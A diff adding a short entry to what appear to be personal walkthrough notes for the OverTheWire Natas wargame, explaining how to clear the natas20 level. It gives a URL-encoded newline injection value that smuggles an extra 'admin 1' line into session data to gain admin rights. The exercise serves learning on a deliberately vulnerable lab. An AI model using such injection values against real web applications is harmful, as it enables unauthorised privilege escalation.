@@ -196,3 +196,11 @@ natas16
  go to solve 19 there is my code also you can use it 
 
  ------------------------------------------------------------------------------------------------------------------------------------------
+
+ natas21
+ for finding that in natas 20 its just simple injection in url ctrl 
+ you have to add ?name=admin%0Aadmin%201 this to end of url and enter and enter again that will be like 
+ http***/?name=admin%0Aadmin%201
+ ------------------------------------------------------------------------------------------------------------------------------------------
+
+ 
